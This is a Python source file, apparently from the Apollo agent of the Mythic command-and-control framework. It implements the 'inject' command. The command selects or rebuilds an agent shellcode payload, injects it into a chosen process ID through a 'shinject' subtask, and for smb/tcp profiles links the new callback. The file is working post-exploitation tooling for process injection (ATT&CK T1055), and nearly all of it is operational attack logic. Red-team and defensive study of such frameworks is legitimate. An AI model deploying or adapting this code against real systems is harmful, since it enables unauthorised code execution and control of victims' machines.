from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *
import base64
import sys
import asyncio


class InjectArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="template",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_payloads,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )]
            ),
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="PID",
                type=ParameterType.Number),
            CommandParameter(
                name="regenerate",
                cli_name="regenerate",
                display_name="Generate New Payload",
                type=ParameterType.Boolean,
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )]
            )
        ]

    errorMsg = "Missing required parameter: {}"

    async def get_payloads(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            CallbackID=inputMsg.Callback,
            PayloadTypes=["apollo"],
            IncludeAutoGeneratedPayloads=False,
            BuildParameters=[MythicRPCPayloadSearchBuildParameter(PayloadType="apollo", BuildParameterValues={"output_type": "Shellcode"})]
        ))

        if payload_search.Success:
            file_names = []
            for f in payload_search.Payloads:
                value = f"{f.Filename} - {f.Description}"
                if value not in file_names:
                    file_names.append(value)
            fileResponse.Success = True
            file_names.reverse()
            fileResponse.Choices = file_names
            return fileResponse
        else:
            fileResponse.Error = payload_search.Error
            return fileResponse


    async def parse_arguments(self):
        if self.command_line[0] != "{":
            raise Exception("Inject requires JSON parameters and not raw command line.")
        self.load_args_from_json_string(self.command_line)
        supplied_dict = json.loads(self.command_line)
        if "process_id" in supplied_dict:
            self.add_arg("pid", int(supplied_dict["process_id"]))
        if self.get_arg("pid") == 0:
            raise Exception("Required non-zero PID")


temp_inject_link_data = {}


async def link_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus=task.SubtaskData.Task.Status, Completed=True)
    resp = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(
        TaskID=task.SubtaskData.Task.ID
    ))
    for r in resp.Responses:
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.TaskData.Task.ID,
            Response=r.Response
        ))
    return response


async def inject_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, Completed=True)
    resp = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(
        TaskID=task.SubtaskData.Task.ID
    ))
    for r in resp.Responses:
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.TaskData.Task.ID,
            Response=r.Response
        ))
    if "error" not in task.SubtaskData.Task.Status:
        if task.TaskData.Task.ID in temp_inject_link_data:
            response.Completed = False
            subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                TaskID=task.TaskData.Task.ID,
                CommandName="link",
                SubtaskCallbackFunction="link_callback",
                Params=json.dumps({
                    "connection_info": temp_inject_link_data[task.TaskData.Task.ID]
                })
            ))
            del temp_inject_link_data[task.TaskData.Task.ID]
    return response


class InjectCommand(CommandBase):
    cmd = "inject"
    attributes=CommandAttributes(
        dependencies=["shinject"]
    )
    needs_admin = False
    help_cmd = "inject (modal popup)"
    description = "Inject agent shellcode into a remote process."
    version = 2
    script_only = True
    author = "@djhohnstein"
    argument_class = InjectArguments
    attackmapping = ["T1055"]
    completion_functions = {"inject_callback": inject_callback, "link_callback": link_callback}
    supported_ui_features = ["process_browser:inject"]

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        string_payload = [x.strip() for x in taskData.args.get_arg("template").split(" - ")]
        filename = string_payload[0]
        desc = string_payload[1]
        payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            CallbackID=taskData.Callback.ID,
            PayloadTypes=["apollo"],
            Filename=filename,
            Description=desc,
            IncludeAutoGeneratedPayloads=False,
            BuildParameters=[MythicRPCPayloadSearchBuildParameter(PayloadType="apollo", BuildParameterValues={"output_type": "Shellcode"})]
        ))

        if not payload_search.Success:
            raise Exception("Failed to find payload: {}".format(taskData.args.get_arg("template")))

        if len(payload_search.Payloads) == 0:
            raise Exception("No payloads found matching {}".format(taskData.args.get_arg("template")))
        str_uuid = payload_search.Payloads[0].UUID
        payload = None
        if taskData.args.get_arg("regenerate"):
            newPayloadResp = await SendMythicRPCPayloadCreateFromUUID(MythicRPCPayloadCreateFromUUIDMessage(
                TaskID=taskData.Task.ID, PayloadUUID=str_uuid, NewDescription="{}'s injection into PID {}".format(taskData.Task.OperatorUsername, str(taskData.args.get_arg("pid")))
            ))
            if newPayloadResp.Success:
                # we know a payload is building, now we want it
                str_uuid = newPayloadResp.NewPayloadUUID
                while True:
                    resp = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                        PayloadUUID=newPayloadResp.NewPayloadUUID
                    ))
                    if resp.Success:
                        if resp.Payloads[0].BuildPhase == 'success':
                            # it's done, so we can register a file for it
                            payload = resp.Payloads[0]
                            break
                        elif resp.Payloads[0].BuildPhase == 'error':
                            raise Exception("Failed to build new payload ")
                        else:
                            await asyncio.sleep(1)
            else:
                logger.exception("Failed to build new payload")
                raise Exception("Failed to build payload from template {}".format(taskData.args.get_arg("template")))
        else:
            # fetch data about the payload
            resp = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                PayloadUUID=str_uuid
            ))
            if resp.Success:
                if resp.Payloads[0].BuildPhase == 'success':
                    # it's done, so we can register a file for it
                    payload = resp.Payloads[0]
                elif resp.Payloads[0].BuildPhase == 'error':
                    raise Exception("Selected Payload Failed to Build ")
                else:
                    raise Exception("Payload isn't done building")
        response.DisplayParams = "payload '{}' into PID {}".format(payload.Filename, taskData.args.get_arg("pid"))
        response.TaskStatus = MythicStatus.Processed
        c2_info = payload.C2Profiles[0]
        is_p2p = c2_info.Name == "smb" or c2_info.Name == "tcp"
        if not is_p2p:
            subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                TaskID=taskData.Task.ID,
                CommandName="shinject",
                Params=json.dumps({"pid": taskData.args.get_arg("pid"), "shellcode-file-id": payload.AgentFileId})
            ))
        else:
            connection_info = {
                "host": "127.0.0.1",
                "agent_uuid": str_uuid,
                "c2_profile": c2_info.to_json()
            }
            connection_info["c2_profile"]["name"] = connection_info["c2_profile"]["c2_profile"]
            connection_info["c2_profile"]["parameters"] = connection_info["c2_profile"]["c2_profile_parameters"]
            del connection_info["c2_profile"]["c2_profile"]
            del connection_info["c2_profile"]["c2_profile_parameters"]
            temp_inject_link_data[taskData.Task.ID] = connection_info
            subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                TaskID=taskData.Task.ID,
                SubtaskCallbackFunction="inject_callback",
                CommandName="shinject",
                Params=json.dumps({"pid": taskData.args.get_arg("pid"), "shellcode-file-id": payload.AgentFileId})
            ))
            if not subtask.Success:
                response.Success = False
                response.Error = subtask.Error
                del temp_inject_link_data[taskData.Task.ID]
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
